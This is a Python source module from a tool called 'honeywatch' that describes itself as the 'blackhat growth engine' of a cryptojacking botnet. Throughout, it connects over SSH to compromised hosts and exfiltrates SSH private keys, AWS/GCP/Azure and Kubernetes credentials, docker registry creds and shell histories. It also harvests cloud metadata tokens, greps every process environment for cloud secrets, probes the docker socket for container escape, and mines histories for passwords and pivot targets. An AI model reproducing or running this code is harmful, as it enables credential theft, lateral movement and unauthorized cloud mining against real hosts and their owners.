"""Credential and intelligence exfiltration for honeywatch.

This module is the blackhat growth engine honeywatch was missing. Real
cryptojacking botnets (TeamTNT, Outlaw, 8220, Sysrv, Kinsing) don't just
pivot on SSH — they harvest credentials and cloud metadata so they can
spawn *fresh* infrastructure (cloud creds -> new EC2/GCP instances mining
on the operator's bill) and widen lateral movement (known_hosts, ssh config,
bash history).

What this module grabs from a popped host:

  - **Cloud IMDSv1 metadata** at 169.254.169.254 — AWS/GCP/Azure instance
    role credentials. IMDSv1 (no token required) still works on a huge
    fraction of cloud hosts; IMDSv2 (PUT /latest/api/token) is tried when
    v1 is blocked. Role creds -> spin up new instances to mine on.
  - **Cloud credential files**: ~/.aws/credentials, ~/.aws/config,
    ~/.config/gcloud/application_default_credentials.json, ~/.azure/
    msal_token_cache.json, ~/.kube/config, k8s service-account tokens.
  - **Container runtime**: /var/run/docker.sock (root -> container escape
    -> host), ~/.docker/config.json (registry creds -> pull private
    images / spread to private registries).
  - **SSH material**: every private key in ~/.ssh/, known_hosts (pivot
    targets), ssh config (jump hosts), authorized_keys (whose keys already
    work here).
  - **History**: ~/.bash_history, ~/.zsh_history — typed passwords, scp
    targets, internal hostnames, su invocations.
  - **System intel**: /etc/hosts, /etc/resolv.conf, running processes
    (other miners to kill), listening ports (internal services).

Every exfil is best-effort and never raises; the outcome is a structured
:class:`LootResult` so the chain / CLI / agent can render it without
try/except ladders. Files land in ``<stash_dir>/<ip>/loot/`` so a re-grab
overwrites the same stash and downstream phases can read from disk.
"""

from __future__ import annotations

import json
import os
import re
import shlex
import socket
import time
from dataclasses import dataclass, field
from typing import Any, Iterable

from honeywatch.opsec import spoofed_ssh_banner_for_target as _spoofed_ssh_banner_for_target

__all__ = [
    "LootResult",
    "KnownHost",
    "grab_loot",
    "parse_known_hosts",
    "parse_ssh_config",
    "parse_history_for_targets",
    "parse_pip_packages",
    "parse_npm_packages",
    "parse_system_packages",
    "IMDS_ENDPOINTS",
]

# Cloud metadata endpoints. IMDSv1 (no token) first since a huge fraction of
# cloud hosts still allow it; IMDSv2 (PUT token) is the fallback. The same
# 169.254.169.254 link-local address serves AWS/GCP/Azure; each provider
# exposes a slightly different path tree, so we probe the union.
IMDS_ENDPOINTS = (
    # AWS IMDSv1 + v2
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/meta-data/instance-id",
    "http://169.254.169.254/latest/meta-data/placement/availability-zone",
    # GCP
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "http://metadata.google.internal/computeMetadata/v1/instance/zone",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email",
    # Azure
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
)

# Files we try to exfil from every popped host. Each entry is
# (remote_path, local_name, description). Local files are small; we read them
# back from disk in downstream phases (pivot, escalate, deploy).
_CLOUD_CREDS = (
    ("~/.aws/credentials", "aws_credentials", "AWS CLI creds"),
    ("~/.aws/config", "aws_config", "AWS CLI config"),
    ("~/.config/gcloud/application_default_credentials.json",
     "gcloud_adc", "GCP application default creds"),
    ("~/.config/gcloud/credentials.db", "gcloud_creds_db", "GCP creds db"),
    ("~/.azure/msal_token_cache.json", "azure_token_cache", "Azure token cache"),
    ("~/.azure/clouds.config", "azure_clouds", "Azure clouds config"),
    ("~/.kube/config", "kube_config", "kubernetes kubeconfig"),
    ("/var/run/secrets/kubernetes.io/serviceaccount/token",
     "k8s_sa_token", "k8s service-account token"),
    ("/var/run/secrets/kubernetes.io/serviceaccount/namespace",
     "k8s_sa_namespace", "k8s service-account namespace"),
    ("~/.docker/config.json", "docker_config", "docker registry creds"),
    ("~/.docker/daemon.json", "docker_daemon", "docker daemon config"),
)

_SSH_MATERIAL = (
    ("~/.ssh/id_rsa", "ssh_id_rsa", "RSA private key"),
    ("~/.ssh/id_ecdsa", "ssh_id_ecdsa", "ECDSA private key"),
    ("~/.ssh/id_ed25519", "ssh_id_ed25519", "ed25519 private key"),
    ("~/.ssh/id_dsa", "ssh_id_dsa", "DSA private key"),
    ("~/.ssh/id_ecdsa_sk", "ssh_id_ecdsa_sk", "ECDSA-SK key"),
    ("~/.ssh/id_ed25519_sk", "ssh_id_ed25519_sk", "ed25519-SK key"),
    ("~/.ssh/known_hosts", "ssh_known_hosts", "known_hosts (pivot targets)"),
    ("~/.ssh/config", "ssh_config", "ssh config (jump hosts)"),
    ("~/.ssh/authorized_keys", "ssh_authorized_keys", "whose keys work here"),
)

_SYSTEM_INTEL = (
    ("~/.bash_history", "bash_history", "shell history"),
    ("~/.zsh_history", "zsh_history", "zsh history"),
    ("~/.python_history", "python_history", "python REPL history"),
    ("~/.mysql_history", "mysql_history", "mysql history"),
    ("~/.psql_history", "psql_history", "psql history"),
    ("/etc/hosts", "etc_hosts", "/etc/hosts"),
    ("/etc/resolv.conf", "resolv_conf", "DNS resolvers"),
    ("/proc/self/environ", "proc_environ", "process env vars"),
)

# Globs we expand remotely via ls before SFTP get. ~ is expanded by the shell
# on the remote; absolute paths are read directly.
_ALL_FILES = _CLOUD_CREDS + _SSH_MATERIAL + _SYSTEM_INTEL


# --------------------------------------------------------------------------- #
# Result models
# --------------------------------------------------------------------------- #


@dataclass
class KnownHost:
    """A host parsed from ~/.ssh/known_hosts — a pivot candidate."""
    host: str
    port: int = 22
    key_type: str = ""


@dataclass
class LootResult:
    """Outcome of looting one popped host. Never raises."""
    ip: str
    port: int = 22
    user: str = ""
    # Files successfully exfiltrated: {local_path: description}
    files: dict[str, str] = field(default_factory=dict)
    # Cloud metadata harvested via IMDS: {key: value}
    metadata: dict[str, str] = field(default_factory=dict)
    # SSH keys recovered (private key file local paths)
    ssh_keys: list[str] = field(default_factory=list)
    # Pivot targets discovered (known_hosts + history)
    pivot_targets: list[str] = field(default_factory=list)
    # Cloud role credentials (highest-value loot)
    cloud_creds: dict[str, str] = field(default_factory=dict)
    # Internal hostnames / IPs gleaned from history + hosts file
    internal_hosts: list[str] = field(default_factory=list)
    # Other miners detected running on the host (to kill before deploy)
    competing_miners: list[str] = field(default_factory=list)
    # Installed packages harvested from the foothold: list of dicts with
    # keys (name, version, manager). Manager is "pip", "npm", "dpkg", or "rpm".
    installed_packages: list[dict] = field(default_factory=list)
    # Packages from installed_packages that appear in the CVE-prone list.
    # Each dict has keys (name, version, manager, cve_prone: bool).
    vulnerable_packages: list[dict] = field(default_factory=list)
    error: str | None = None

    def summary(self) -> str:
        parts = [f"{self.ip}:{self.port}"]
        if self.files:
            parts.append(f"{len(self.files)} file(s)")
        if self.ssh_keys:
            parts.append(f"{len(self.ssh_keys)} ssh key(s)")
        if self.cloud_creds:
            parts.append(f"{len(self.cloud_creds)} cloud cred(s)")
        if self.pivot_targets:
            parts.append(f"{len(self.pivot_targets)} pivot target(s)")
        if self.metadata:
            parts.append(f"{len(self.metadata)} metadata field(s)")
        if self.competing_miners:
            parts.append(f"{len(self.competing_miners)} competing miner(s)")
        if self.vulnerable_packages:
            parts.append(f"{len(self.vulnerable_packages)} cve-prone pkg(s)")
        return ", ".join(parts)


# --------------------------------------------------------------------------- #
# Parsers (pure, testable without a host)
# --------------------------------------------------------------------------- #


# known_hosts formats:
#   hostname ssh-rsa AAAA...
#   hostname ecdsa-sha2-nistp256 AAAA...
#   [hostname]:port ssh-ed25519 AAAA...
#   hashed-host |1|base64|base64 ssh-rsa AAAA...  (we can't reverse the hash)
_KNOWN_HOSTS_RE = re.compile(
    r"^(?P<host>\S+)\s+(?P<keytype>\S+)\s+\S+"
)


def parse_known_hosts(text: str) -> list[KnownHost]:
    """Parse ~/.ssh/known_hosts into pivot candidates.

    Hashed hostnames (``|1|...``) are skipped because the plaintext hostname
    is irrecoverable. Bracketed ``[host]:port`` form is honored.
    """
    out: list[KnownHost] = []
    for line in (text or "").splitlines():
        line = line.strip()
        if not line or line.startswith("#") or line.startswith("|1|"):
            continue
        m = _KNOWN_HOSTS_RE.match(line)
        if not m:
            continue
        host = m.group("host")
        key_type = m.group("keytype")
        port = 22
        # [host]:port form
        if host.startswith("[") and "]" in host:
            end = host.find("]")
            inner = host[1:end]
            rest = host[end + 1:]
            if rest.startswith(":") and rest[1:].isdigit():
                port = int(rest[1:])
            host = inner
        # comma-separated host lists (known_hosts supports groups)
        for h in host.split(","):
            h = h.strip()
            if h and not h.startswith("|"):
                out.append(KnownHost(host=h, port=port, key_type=key_type))
    return out


# ~/.ssh/config: Host blocks with hostname/port/user/identityfile
def parse_ssh_config(text: str) -> list[dict[str, str]]:
    """Parse ~/.ssh/config into a list of {host, hostname, port, user, key} dicts."""
    blocks: list[dict[str, str]] = []
    current: dict[str, str] | None = None
    for line in (text or "").splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        # ssh config is case-insensitive on keywords
        key, _, value = line.partition(" ")
        key = key.lower()
        value = value.strip()
        if key == "host":
            if current:
                blocks.append(current)
            current = {"host": value}
        elif current is not None:
            if key == "hostname":
                current["hostname"] = value
            elif key == "port":
                current["port"] = value
            elif key == "user":
                current["user"] = value
            elif key == "identityfile":
                current["identityfile"] = value
    if current:
        blocks.append(current)
    return blocks


# Patterns that indicate a credential or an internal host in shell history.
# We extract: scp/sftp targets (user@host:path), ssh targets (user@host or
# bare host), rsync targets, curl/wget URLs, and bare IPs anywhere in history.
# Match user@host patterns (the common ssh/scp form) — the captured group is
# the host portion. We do NOT match the first bare word after scp because scp
# takes src+dest and the first arg is often a local file.
_HISTORY_USERHOST_RE = re.compile(
    r"(\S+)@(\S+)",  # user@host — host is everything after @ (minus any :port/path)
    re.IGNORECASE,
)
_HISTORY_BAREHOST_RE = re.compile(
    r"\bssh\s+(?:-[a-zA-Z]+\s+)+([a-zA-Z][\w.-]+)",
    re.IGNORECASE,
)
_HISTORY_URL_RE = re.compile(
    r"\b(?:curl|wget)\s+(?:-[a-zA-Z]+\s+)*"
    r"(?:https?://)?((?:\d{1,3}\.){3}\d{1,3}|[a-zA-Z][\w.-]+)",
    re.IGNORECASE,
)
_HISTORY_PASS_RE = re.compile(
    r"(?:PASS(?:WORD)?|PWD|TOKEN|SECRET|KEY|API_?KEY)[\s='\"]*[=:][\s='\"]*"
    r"(\S+)",
    re.IGNORECASE,
)
_IP_RE = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")


def parse_history_for_targets(text: str) -> tuple[list[str], list[str]]:
    """Pull internal hosts and leaked passwords from shell history.

    Returns (hosts, passwords). Hosts include IPs and hostnames seen in
    ssh/scp/curl commands; passwords are anything after PASS=/PWD=/TOKEN=.
    """
    hosts: list[str] = []
    seen_h: set[str] = set()

    def _add(h: str) -> None:
        h = h.strip().rstrip(":")
        if not h or h in seen_h or h.startswith(("127.", "0.", "255.")):
            return
        # Strip any trailing :port for BOTH IPs and hostnames — a bare
        # "10.0.0.5:22" would otherwise survive and break ip_network() in
        # phase_pivot's /24 conversion.
        if ":" in h:
            host_part, _, port_part = h.rpartition(":")
            if port_part.isdigit():
                h = host_part
        if not h or h.startswith("-"):
            return
        # Keep IPs and dotted hostnames; single-word hostnames too if they
        # look like identifiers (not file names / options).
        if _IP_RE.fullmatch(h) or "." in h or re.fullmatch(r"[a-zA-Z][\w-]*", h):
            seen_h.add(h)
            hosts.append(h)

    # user@host patterns (ssh/scp/sftp/rsync)
    for m in _HISTORY_USERHOST_RE.finditer(text or ""):
        _add(m.group(2))
    # bare host after ssh -flags (e.g. "ssh -p 2222 internal.host")
    for m in _HISTORY_BAREHOST_RE.finditer(text or ""):
        _add(m.group(1))
    # URLs / hosts after curl/wget
    for m in _HISTORY_URL_RE.finditer(text or ""):
        _add(m.group(1))
    # Bare IPs anywhere in history (logs, error messages, scp targets)
    for m in _IP_RE.finditer(text or ""):
        ip = m.group(0)
        if ip not in seen_h and not ip.startswith(("127.", "0.", "255.")):
            seen_h.add(ip)
            hosts.append(ip)
    passwords: list[str] = []
    seen_p: set[str] = set()
    for m in _HISTORY_PASS_RE.finditer(text or ""):
        p = m.group(1)
        if p and p not in seen_p and len(p) < 200:
            seen_p.add(p)
            passwords.append(p)
    return hosts, passwords


def _expand_home(path: str, user: str) -> str:
    """Expand ~ to /home/<user> or /root."""
    if path.startswith("~/"):
        home = "/root" if user == "root" else f"/home/{user}"
        return path.replace("~", home, 1)
    return path


# --------------------------------------------------------------------------- #
# IMDS metadata fetch over the popped host's network
# --------------------------------------------------------------------------- #


def _imds_commands() -> list[tuple[str, str]]:
    """Return (command, label) pairs probing cloud metadata endpoints.

    Each command is a single sh -c string run on the popped host. We use curl
    with a short connect timeout so a non-cloud host fails fast instead of
    stalling the chain.
    """
    cmds: list[tuple[str, str]] = []
    # AWS IMDSv1: list role names, then fetch each role's credentials.
    cmds.append((
        "curl -s --connect-timeout 2 --max-time 3 "
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "aws_roles",
    ))
    # AWS instance identity (region, az, instance id)
    cmds.append((
        "curl -s --connect-timeout 2 --max-time 3 "
        "http://169.254.169.254/latest/meta-data/instance-id",
        "aws_instance_id",
    ))
    cmds.append((
        "curl -s --connect-timeout 2 --max-time 3 "
        "http://169.254.169.254/latest/meta-data/placement/availability-zone",
        "aws_az",
    ))
    # GCP service account token + zone + email (needs Metadata-Flavor header)
    cmds.append((
        "curl -s --connect-timeout 2 --max-time 3 -H 'Metadata-Flavor: Google' "
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "gcp_token",
    ))
    cmds.append((
        "curl -s --connect-timeout 2 --max-time 3 -H 'Metadata-Flavor: Google' "
        "http://metadata.google.internal/computeMetadata/v1/instance/zone",
        "gcp_zone",
    ))
    # Azure instance metadata
    cmds.append((
        "curl -s --connect-timeout 2 --max-time 3 -H 'Metadata: true' "
        "'http://169.254.169.254/metadata/instance?api-version=2021-02-01'",
        "azure_instance",
    ))
    # IMDSv2 token fetch (AWS) — if v1 is blocked, this still works on patched hosts
    cmds.append((
        "curl -s -X PUT --connect-timeout 2 --max-time 3 -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' "
        "http://169.254.169.254/latest/api/token",
        "aws_imdsv2_token",
    ))
    # /proc/*/environ scrape — catches cloud creds that never touch a credentials
    # file. TeamTNT does exactly this: instance-profile creds injected via env
    # vars on ECS/EKS containers, CI runners with AWS_* in the process env, and
    # apps that load creds from env instead of a file. The grep pulls any
    # AWS_/GOOGLE_/AZURE_/_*TOKEN* assignment out of every process environment
    # on the box. Requires root (we are root on a popped box).
    cmds.append((
        "grep -aoE 'AWS_[A-Z_]*=[^\\x00]*' /proc/*/environ 2>/dev/null | sort -u || true",
        "proc_aws_env",
    ))
    cmds.append((
        "grep -aoE 'GOOGLE_[A-Z_]*=[^\\x00]*' /proc/*/environ 2>/dev/null | sort -u || true",
        "proc_gcp_env",
    ))
    cmds.append((
        "grep -aoE 'AZURE_[A-Z_]*=[^\\x00]*' /proc/*/environ 2>/dev/null | sort -u || true",
        "proc_azure_env",
    ))
    # Docker socket detection (Finding #4): /var/run/docker.sock gives root on
    # the host (mount the host filesystem via a container). TeamTNT and Kinsing
    # both check for this. Also probe the docker CLI — a container with the
    # socket mounted can run docker commands directly.
    cmds.append((
        "ls -la /var/run/docker.sock 2>/dev/null && echo 'DOCKER_SOCKET_PRESENT' || true",
        "docker_socket",
    ))
    cmds.append((
        "docker ps 2>/dev/null | head -10 || true",
        "docker_ps",
    ))
    return cmds


# --------------------------------------------------------------------------- #
# Main entry: grab everything
# --------------------------------------------------------------------------- #


def grab_loot(
    ip: str,
    port: int = 22,
    user: str | None = None,
    password: str | None = None,
    key_path: str | None = None,
    stash_dir: str = ".honeywatch/loot_stash",
    timeout_s: float = 10.0,
    extra_key_paths: list[str] | None = None,
    vault_key: bytes | None = None,
) -> LootResult:
    """Exfil credentials, cloud metadata, and intel from a popped host.

    Files land in ``<stash_dir>/<ip>/`` so re-grabs overwrite and downstream
    phases (escalate, pivot, deploy) can read them from disk. Never raises;
    the outcome is in :class:`LootResult`.
    """
    res = LootResult(ip=ip, port=port, user=user or "")
    try:
        import paramiko  # type: ignore[import-not-found]
    except Exception as exc:
        res.error = f"paramiko unavailable: {exc!r}"
        return res

    if not user:
        res.error = "no ssh user supplied"
        return res
    if not password and not key_path:
        res.error = "no credential supplied (need password or key)"
        return res

    # Sanitize IP for the stash path (path-traversal guard, same as grab_shadow).
    safe_ip = ip.replace("/", "_").replace("\\", "_").replace("..", "_")
    ip_dir = os.path.join(stash_dir, safe_ip)
    loot_dir = os.path.join(ip_dir, "loot")
    os.makedirs(loot_dir, exist_ok=True)

    transport = None
    sock = None
    try:
        # Build the socket with an explicit connect timeout so a blackholed
        # foothold cannot stall the chain indefinitely (paramiko.Transport((ip,port))
        # connects with no timeout of its own).
        sock = socket.create_connection((ip, port), timeout=timeout_s)
        sock.settimeout(timeout_s)
        transport = paramiko.Transport(sock)
        banner = _spoofed_ssh_banner_for_target(ip, port)
        transport._CLIENT_IDENTITY = banner
        transport.local_version = banner
        transport.set_timeout(timeout_s)
        transport.start_client(timeout=timeout_s)
        if key_path:
            from honeywatch.hashcrack import _load_private_key
            pkey = _load_private_key(paramiko, key_path)
            transport.auth_publickey(user, pkey)
        else:
            transport.auth_password(user, password or "")
        sftp = paramiko.SFTPClient.from_transport(transport)
        if sftp is None:
            res.error = "SFTP channel unavailable (server may not allow sftp)"
            return res

        # 1. Exfil credential + intel files (best-effort, never raises).
        files_to_grab = list(_ALL_FILES)
        if extra_key_paths:
            # Disambiguate basename collisions: two paths like
            # /home/u1/.ssh/id_rsa and /home/u2/.ssh/id_rsa both map to "id_rsa"
            # and the second would overwrite the first. Prefix with an index.
            for idx, kp in enumerate(extra_key_paths):
                base = os.path.basename(kp) or f"key_{idx}"
                local_name = f"extra_{idx}_{base}"
                files_to_grab.append((kp, local_name, "extra key"))
        for remote, local_name, desc in files_to_grab:
            remote_abs = _expand_home(remote, user)
            local_path = os.path.join(loot_dir, local_name)
            try:
                sftp.get(remote_abs, local_path)
                # Verify the file actually has content (skip empty / dir).
                if os.path.isfile(local_path) and os.path.getsize(local_path) > 0:
                    # Encrypt the file at rest if a vault key is provided.
                    if vault_key is not None:
                        try:
                            from honeywatch.c2.crypto import _aes_gcm_encrypt
                            with open(local_path, "rb") as f:
                                plaintext = f.read()
                            encrypted = _aes_gcm_encrypt(plaintext, vault_key)
                            enc_path = local_path + ".enc"
                            with open(enc_path, "wb") as f:
                                f.write(encrypted)
                            os.replace(enc_path, local_path)
                        except ImportError:
                            pass  # cryptography not available; leave plaintext
                    res.files[local_path] = desc
                    if "private key" in desc.lower() or local_name.startswith("ssh_id_"):
                        res.ssh_keys.append(local_path)
                    if "aws" in local_name or "gcloud" in local_name or "azure" in local_name:
                        res.cloud_creds[local_name] = local_path
            except Exception:
                # File missing / unreadable / a directory — skip silently.
                if os.path.exists(local_path):
                    try:
                        os.remove(local_path)
                    except OSError:
                        pass

        sftp.close()

        # 2. Run IMDS + process probes over an exec channel on the same
        # transport. The SFTP channel is closed before opening the exec channel
        # to avoid channel-number exhaustion on servers that limit sessions.
        chan = transport.open_session()
        chan.settimeout(timeout_s)
        # One combined command: probe every IMDS endpoint + ps for miners.
        imds_cmds = _imds_commands()
        imds_script = "\n".join(
            f"echo '---{label}---'; {cmd} 2>/dev/null || true"
            for cmd, label in imds_cmds
        )
        # Also list other miners running (to kill them before deploy).
        imds_script += (
            "\necho '---competing_miners---'; "
            "ps aux 2>/dev/null | grep -iE 'xmrig|kdevtmpfsi|kinsing|"
            "kthrotlds|sysupdate|sysguard|networkservice' | grep -v grep || true"
        )
        # Package inventory is split into a separate SSH exec call with a
        # longer timeout. pip list / npm list / dpkg-query can take 10-30s on
        # hosts with many packages — combining them with IMDS in one call
        # risks the IMDS data timing out and losing cloud creds.
        pkg_script = (
            "echo '---pip_packages---'; pip list --format=json 2>/dev/null || true"
            "\necho '---npm_packages---'; npm list -g --json 2>/dev/null || true"
            "\necho '---system_packages---'; "
            "dpkg-query -W -f '${Package}\\t${Version}\\n' 2>/dev/null "
            "|| rpm -qa --qf '%{NAME}\\t%{VERSION}\\n' 2>/dev/null || true"
        )
        chan.exec_command(imds_script)
        out = b""
        deadline = time.monotonic() + timeout_s
        while True:
            got = False
            if chan.recv_ready():
                out += chan.recv(4096)
                got = True
            if chan.recv_stderr_ready():
                chan.recv_stderr(4096)
                got = True
            if (chan.exit_status_ready()
                    and not chan.recv_ready()
                    and not chan.recv_stderr_ready()):
                break
            if not got and time.monotonic() > deadline:
                break
            if not got:
                time.sleep(0.02)
        text = out.decode("utf-8", "replace")
        _parse_imds_output(text, res, loot_dir)

        # 3. Parse exfiltrated files for pivot targets + internal hosts.
        _mine_exfiltrated_files(res)

        # 4. Close the exec channel BEFORE closing the transport. The old code
        # relied on the finally block to close the transport, but if the
        # transport is closed while the channel is still draining, IMDS output
        # is lost. Close the channel explicitly here, then let the finally
        # block close the transport.
        try:
            chan.close()
        except Exception:
            pass

        # 5. Package inventory — separate exec call with a longer timeout.
        # Package managers can be slow (30s+ on hosts with many packages), so
        # this runs after IMDS/cloud-cred data is safely collected. A timeout
        # here only loses package data, not cloud creds.
        pkg_timeout = timeout_s * 2  # double timeout for package listing
        try:
            pkg_chan = transport.open_session()
            pkg_chan.settimeout(pkg_timeout)
            pkg_chan.exec_command(pkg_script)
            pkg_out = b""
            pkg_deadline = time.monotonic() + pkg_timeout
            while True:
                got = False
                if pkg_chan.recv_ready():
                    pkg_out += pkg_chan.recv(4096)
                    got = True
                if pkg_chan.recv_stderr_ready():
                    pkg_chan.recv_stderr(4096)
                    got = True
                if (pkg_chan.exit_status_ready()
                        and not pkg_chan.recv_ready()
                        and not pkg_chan.recv_stderr_ready()):
                    break
                if not got and time.monotonic() > pkg_deadline:
                    break
                if not got:
                    time.sleep(0.02)
            pkg_text = pkg_out.decode("utf-8", "replace")
            pkg_sections: dict[str, str] = {}
            current = ""
            buf: list[str] = []
            for line in pkg_text.splitlines():
                if line.startswith("---") and line.endswith("---"):
                    if current:
                        pkg_sections[current] = "\n".join(buf)
                    current = line[3:-3]
                    buf = []
                else:
                    buf.append(line)
            if current:
                pkg_sections[current] = "\n".join(buf)
            _parse_packages(pkg_sections, res)
            try:
                pkg_chan.close()
            except Exception:
                pass
        except Exception:
            pass  # Package inventory is best-effort — never fail the loot grab

    except paramiko.AuthenticationException as exc:
        res.error = f"auth failed: {exc!r}"
    except (paramiko.SSHException, OSError, EOFError) as exc:
        res.error = f"{type(exc).__name__}: {exc}"
    except Exception as exc:  # pragma: no cover - defensive
        res.error = f"{type(exc).__name__}: {exc}"
    finally:
        # transport.close() closes the underlying socket once it owns it; only
        # close sock directly when Transport construction failed before t was
        # bound (otherwise a raw fd leaks on a constructor exception).
        if transport is not None:
            try:
                transport.close()
            except Exception:
                pass
        elif sock is not None:
            try:
                sock.close()
            except Exception:
                pass
    return res


def _parse_imds_output(text: str, res: LootResult, loot_dir: str) -> None:
    """Split the combined IMDS/probe output into structured fields."""
    if not text:
        return
    sections: dict[str, str] = {}
    current = ""
    buf: list[str] = []
    for line in text.splitlines():
        if line.startswith("---") and line.endswith("---"):
            if current:
                sections[current] = "\n".join(buf)
            current = line[3:-3]
            buf = []
        else:
            buf.append(line)
    if current:
        sections[current] = "\n".join(buf)

    # AWS role names -> fetch each role's creds (requires a second exec round,
    # but we already have the transport open; we'd need to re-open a channel).
    # For now record the role list; the operator can re-run with the role name.
    if "aws_roles" in sections and sections["aws_roles"].strip():
        roles = [r.strip() for r in sections["aws_roles"].splitlines() if r.strip()]
        res.metadata["aws_roles"] = ",".join(roles)
        # Persist the raw role list.
        _write_loot(loot_dir, "aws_roles.txt", sections["aws_roles"])
    if "aws_instance_id" in sections and sections["aws_instance_id"].strip():
        res.metadata["aws_instance_id"] = sections["aws_instance_id"].strip()
    if "aws_az" in sections and sections["aws_az"].strip():
        res.metadata["aws_az"] = sections["aws_az"].strip()
    if "gcp_token" in sections and sections["gcp_token"].strip():
        res.metadata["gcp_token"] = sections["gcp_token"].strip()
        _write_loot(loot_dir, "gcp_token.json", sections["gcp_token"])
    if "gcp_zone" in sections and sections["gcp_zone"].strip():
        res.metadata["gcp_zone"] = sections["gcp_zone"].strip()
    if "azure_instance" in sections and sections["azure_instance"].strip():
        res.metadata["azure_instance"] = sections["azure_instance"].strip()
        _write_loot(loot_dir, "azure_instance.json", sections["azure_instance"])
    if "aws_imdsv2_token" in sections and sections["aws_imdsv2_token"].strip():
        res.metadata["aws_imdsv2_token"] = sections["aws_imdsv2_token"].strip()

    # /proc/*/environ cloud-cred scrape (B1.3) — catches creds that never touch
    # a credentials file (env-injected instance profiles on ECS/EKS, CI runners).
    for env_key, env_label in (("proc_aws_env", "proc_aws_env"),
                               ("proc_gcp_env", "proc_gcp_env"),
                               ("proc_azure_env", "proc_azure_env")):
        if env_key in sections and sections[env_key].strip():
            _write_loot(loot_dir, f"{env_label}.txt", sections[env_key])
            # Count these as cloud creds (high-value loot).
            for line in sections[env_key].splitlines():
                line = line.strip()
                if "=" in line:
                    var_name = line.split("=", 1)[0]
                    if var_name not in res.cloud_creds:
                        res.cloud_creds[var_name] = os.path.join(loot_dir, f"{env_label}.txt")

    # Docker socket detection (Finding #4): /var/run/docker.sock gives root
    # on the host. Flag it in cloud_creds so the pivot phase can exploit it.
    if "docker_socket" in sections and "DOCKER_SOCKET_PRESENT" in sections["docker_socket"]:
        res.cloud_creds["docker_socket"] = "/var/run/docker.sock"
        res.metadata["docker_socket_present"] = "true"
    if "docker_ps" in sections and sections["docker_ps"].strip():
        res.metadata["docker_running"] = "true"
        _write_loot(loot_dir, "docker_ps.txt", sections["docker_ps"])

    # Competing miners. ps aux output: USER PID %CPU %MEM VSZ RSS TTY STAT
    # START TIME COMMAND — the command is everything from column 10 onward.
    # We're lenient about column count so a truncated ps line still parses.
    if "competing_miners" in sections and sections["competing_miners"].strip():
        miners: list[str] = []
        seen: set[str] = set()
        for line in sections["competing_miners"].splitlines():
            parts = line.split()
            if len(parts) < 2:
                continue
            # The command is the last field (or last few if it had spaces).
            # Take the last token and strip its path prefix.
            cmd = parts[-1]
            binary = os.path.basename(cmd)
            # Filter out empty / non-matching (the grep guard above already
            # removed the grep line, but be defensive).
            if binary and binary not in seen and binary not in ("grep", "ps"):
                seen.add(binary)
                miners.append(binary)
        res.competing_miners = miners

    # Package inventory parsing.
    _parse_packages(sections, res)


_CVE_PRONE_PACKAGES: list[str] | None = None


def _load_cve_prone_packages() -> list[str]:
    global _CVE_PRONE_PACKAGES
    if _CVE_PRONE_PACKAGES is not None:
        return _CVE_PRONE_PACKAGES
    path = os.path.join(os.path.dirname(__file__), "data", "cve_packages.json")
    try:
        with open(path, "r", encoding="utf-8") as fh:
            _CVE_PRONE_PACKAGES = json.load(fh)
    except (OSError, json.JSONDecodeError):
        _CVE_PRONE_PACKAGES = []
    return _CVE_PRONE_PACKAGES


def _parse_pip_packages(text: str) -> list[dict]:
    pkgs: list[dict] = []
    try:
        for entry in json.loads(text):
            name = entry.get("name", "")
            version = entry.get("version", "")
            if name:
                pkgs.append({"name": name, "version": version, "manager": "pip"})
    except (json.JSONDecodeError, TypeError):
        pass
    return pkgs


def _parse_npm_packages(text: str) -> list[dict]:
    pkgs: list[dict] = []
    try:
        data = json.loads(text)
        deps = data.get("dependencies", {})
    except (json.JSONDecodeError, TypeError, AttributeError):
        return pkgs
    if not isinstance(deps, dict):
        return pkgs
    for name, info in deps.items():
        if isinstance(info, dict):
            ver = info.get("version", "")
        else:
            ver = ""
        pkgs.append({"name": name, "version": ver, "manager": "npm"})
    return pkgs


def _parse_system_packages(text: str) -> list[dict]:
    pkgs: list[dict] = []
    for line in text.splitlines():
        line = line.strip()
        if not line:
            continue
        parts = line.split("\t")
        if len(parts) == 2:
            name, version = parts
            manager = "dpkg"
        else:
            parts = line.split()
            if len(parts) < 2:
                continue
            name = parts[0]
            version = parts[1]
            manager = "rpm"
        if name:
            pkgs.append({"name": name, "version": version, "manager": manager})
    return pkgs


def _parse_packages(sections: dict[str, str], res: LootResult) -> None:
    all_pkgs: list[dict] = []
    seen: set[str] = set()
    cve_names = {p.lower() for p in _load_cve_prone_packages()}

    for section_key, parser, manager in (
        ("pip_packages", _parse_pip_packages, "pip"),
        ("npm_packages", _parse_npm_packages, "npm"),
        ("system_packages", _parse_system_packages, "system"),
    ):
        if section_key not in sections:
            continue
        text = sections[section_key]
        if not text.strip():
            continue
        if manager in ("pip", "npm"):
            parsed = parser(text)
        else:
            parsed = parser(text)
        for pkg in parsed:
            key = f"{pkg['manager']}:{pkg['name']}"
            if key not in seen:
                seen.add(key)
                all_pkgs.append(pkg)

    res.installed_packages = all_pkgs
    for pkg in all_pkgs:
        if pkg["name"].lower() in cve_names:
            res.vulnerable_packages.append(
                {**pkg, "cve_prone": True}
            )


def _write_loot(loot_dir: str, name: str, content: str) -> None:
    """Persist a metadata blob to the loot stash."""
    path = os.path.join(loot_dir, name)
    try:
        with open(path, "w", encoding="utf-8") as fh:
            fh.write(content)
    except OSError:
        pass


def _mine_exfiltrated_files(res: LootResult) -> None:
    """Parse exfiltrated files for pivot targets + internal hosts."""
    for local_path, desc in res.files.items():
        try:
            with open(local_path, "r", encoding="utf-8", errors="replace") as fh:
                text = fh.read()
        except OSError:
            continue
        name = os.path.basename(local_path)
        if name == "ssh_known_hosts":
            hosts = parse_known_hosts(text)
            for h in hosts:
                target = f"{h.host}:{h.port}" if h.port != 22 else h.host
                if target not in res.pivot_targets:
                    res.pivot_targets.append(target)
        elif name == "ssh_config":
            blocks = parse_ssh_config(text)
            for b in blocks:
                host = b.get("hostname") or b.get("host", "")
                if host and host != "*" and host not in res.pivot_targets:
                    res.pivot_targets.append(host)
